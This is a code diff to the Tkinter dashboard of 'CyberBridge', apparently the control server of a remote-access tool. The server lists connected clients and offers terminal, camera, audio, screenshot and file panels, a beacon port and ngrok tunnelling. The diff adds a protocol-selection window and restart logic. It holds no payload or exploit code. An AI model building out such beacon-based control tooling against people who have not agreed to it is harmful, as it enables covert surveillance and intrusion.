@@ -1,11 +1,11 @@
 """
 CyberBridge - Main Dashboard (Server UI)
 Full Tkinter interface: session list on the left, tabbed panels on the right.
-Green-on-black matrix aesthetic.
+Green-on-black liquid glass matrix aesthetic.
 """
 
 import tkinter as tk
-from tkinter import ttk
+from tkinter import ttk, messagebox
 import threading
 import time
 import datetime
@@ -24,7 +24,8 @@ from server.ui.screenshot_panel import ScreenshotPanel
 from server.ui.sysinfo_panel    import SystemInfoPanel
 from server.ui.audio_panel      import AudioPanel
 from server.ui.file_panel       import FilePanel
-from server.core.session_manager import SessionManager
+from server.core.session_manager import ProtocolFactory
+from server.core.errors         import ProtocolNotSupportedError, CyberBridgeError
 
 
 # ─── Animated Matrix Rain Canvas ─────────────────────────────────────────────
@@ -101,10 +102,11 @@ class Dashboard:
         self._root    = tk.Tk()
         self._session = None
         self._mgr     = None
+        self._current_protocol = "HTTP"
         self._setup_root()
         self._build_menu()
         self._build_layout()
-        self._start_session_manager()
+        self._start_session_manager(self._current_protocol)
         self._start_clock()
 
     # ─── Root window ──────────────────────────────────────────────────────────
@@ -117,7 +119,7 @@ class Dashboard:
         r.configure(bg=BG_DEEP)
         r.protocol("WM_DELETE_WINDOW", self._on_close)
 
-        # Custom ttk notebook style
+        # Custom ttk notebook style for Liquid Glass look
         style = ttk.Style(r)
         style.theme_use("clam")
         style.configure("CyberBridge.TNotebook",
@@ -144,6 +146,11 @@ class Dashboard:
         fm.add_command(label="Settings", command=self._open_settings)
         fm.add_separator()
         fm.add_command(label="Exit", command=self._on_close)
+        
+        pm = tk.Menu(mb, tearoff=0, bg=BG_CARD, fg=FG_PRIMARY,
+                     activebackground=BG_PANEL, activeforeground=FG_CYAN)
+        mb.add_cascade(label="Protocolos", menu=pm)
+        pm.add_command(label="Select Protocol...", command=self._open_protocols_window)
 
         hm = tk.Menu(mb, tearoff=0, bg=BG_CARD, fg=FG_PRIMARY,
                      activebackground=BG_PANEL, activeforeground=FG_CYAN)
@@ -244,7 +251,7 @@ class Dashboard:
                       highlightbackground=FG_DIM, highlightthickness=1)
         sb.pack(fill="x", side="bottom")
         self._bottom_lbl = tk.Label(sb,
-                                    text="CyberBridge Server  |  HTTP :18812  |  ngrok compatible",
+                                    text="CyberBridge Server  |  HTTP  |  ngrok compatible",
                                     bg=BG_CARD, fg=FG_DIM, font=FONT_STATUS, anchor="w")
         self._bottom_lbl.pack(side="left", padx=8, pady=3)
 
@@ -252,6 +259,13 @@ class Dashboard:
                                         bg=BG_CARD, fg=FG_SECONDARY,
                                         font=FONT_STATUS)
         self._conn_count_lbl.pack(side="right", padx=8)
+
+        # Explicit button for Protocols
+        self._proto_btn = tk.Button(sb, text="⚙ PROTOCOLOS",
+                                    command=self._open_protocols_window,
+                                    bg=BG_DEEP, fg=FG_CYAN, font=FONT_STATUS,
+                                    relief="flat", cursor="hand2", bd=0)
+        self._proto_btn.pack(side="right", padx=16, pady=2)
 
     # ─── Session management ───────────────────────────────────────────────────
 
@@ -320,13 +334,40 @@ class Dashboard:
             self._status_lbl.config(text="● AWAITING CONNECTIONS", fg=FG_DIM)
         self._on_sessions_update()
 
-    # ─── Session manager ──────────────────────────────────────────────────────
+    # ─── Session manager (Protocol Factory) ───────────────────────────────────
 
-    def _start_session_manager(self):
-        self._mgr = SessionManager(on_client_update=self._on_sessions_update)
-        self._mgr.start()
+    def _start_session_manager(self, protocol="HTTP"):
+        if self._mgr:
+            self._mgr.stop()
+            # clear UI sessions on protocol change
+            self._conn_panel.update_sessions([])
+            self._conn_count_lbl.config(text="Clients: 0")
+
+        try:
+            self._mgr = ProtocolFactory.create_manager(protocol, on_client_update=self._on_sessions_update)
+            self._mgr.start()
+            self._current_protocol = protocol
+            self._bottom_lbl.config(
+                text=f"CyberBridge Server  |  {protocol.upper()}  |  ngrok compatible",
+                fg=FG_CYAN
+            )
+        except ProtocolNotSupportedError as e:
+            messagebox.showerror("Protocol Error", str(e), parent=self._root)
+            # Revert to HTTP
+            if not getattr(self, "_current_protocol", None) or self._current_protocol != "HTTP":
+                 self._current_protocol = "HTTP"
+                 self._mgr = ProtocolFactory.create_manager("HTTP", on_client_update=self._on_sessions_update)
+                 self._mgr.start()
+                 self._bottom_lbl.config(
+                    text=f"CyberBridge Server  |  HTTP  |  ngrok compatible (Fallback)",
+                    fg=FG_YELLOW
+                 )
+        except CyberBridgeError as e:
+             messagebox.showerror("Server Error", f"Failed to start server:\n{str(e)}", parent=self._root)
 
     def _on_sessions_update(self):
+        if not self._mgr:
+            return
         sessions = self._mgr.get_sessions()
         self._conn_panel.update_sessions(sessions)
         self._conn_count_lbl.config(text=f"Clients: {len(sessions)}")
@@ -362,6 +403,42 @@ class Dashboard:
         tk.Label(win, text="Beacon Port:  18812\nRPC Port:      18813",
                  font=FONT_MONO, bg=BG_PANEL, fg=FG_SECONDARY).pack()
 
+    def _open_protocols_window(self):
+        """Window to select the communication protocol dynamically."""
+        win = tk.Toplevel(self._root)
+        win.title("Select Protocol")
+        win.configure(bg=BG_PANEL)
+        win.geometry("420x220")
+        
+        tk.Label(win, text="Network Protocol Settings",
+                 font=FONT_MONO_XL, bg=BG_PANEL, fg=FG_PRIMARY).pack(pady=15)
+                 
+        tk.Label(win, text="Choose the protocol for incoming connections:",
+                 font=FONT_MONO, bg=BG_PANEL, fg=FG_SECONDARY).pack(pady=5)
+                 
+        # Protocol selection
+        protocol_var = tk.StringVar(value=self._current_protocol)
+        
+        frame = tk.Frame(win, bg=BG_PANEL)
+        frame.pack(pady=10)
+        
+        protocols = ["HTTP", "UDP", "TCP", "RCP"]
+        for p in protocols:
+            rb = tk.Radiobutton(frame, text=p, variable=protocol_var, value=p,
+                                bg=BG_PANEL, fg=FG_PRIMARY, selectcolor=BG_DEEP,
+                                activebackground=BG_PANEL, activeforeground=FG_CYAN,
+                                font=FONT_MONO)
+            rb.pack(side="left", padx=10)
+            
+        def _apply():
+            selected = protocol_var.get()
+            win.destroy()
+            if selected != self._current_protocol:
+                self._start_session_manager(selected)
+                
+        tk.Button(win, text="APPLY PROTOCOL", command=_apply, **STYLE_BUTTON).pack(pady=15)
+
+
     def _show_about(self):
         win = tk.Toplevel(self._root)
         win.title("About")
@@ -371,7 +448,7 @@ class Dashboard:
                  font=FONT_TITLE, bg=BG_PANEL, fg=FG_PRIMARY).pack(pady=16)
         tk.Label(win,
                  text="Remote Monitoring Station\n"
-                      "RPC via RPyC  |  AES-256 encryption\n"
+                      "Multi-Protocol Architecture  |  AES-256\n"
                       "Terminal · Camera · Audio · Screenshot",
                  font=FONT_MONO, bg=BG_PANEL, fg=FG_SECONDARY).pack()
 
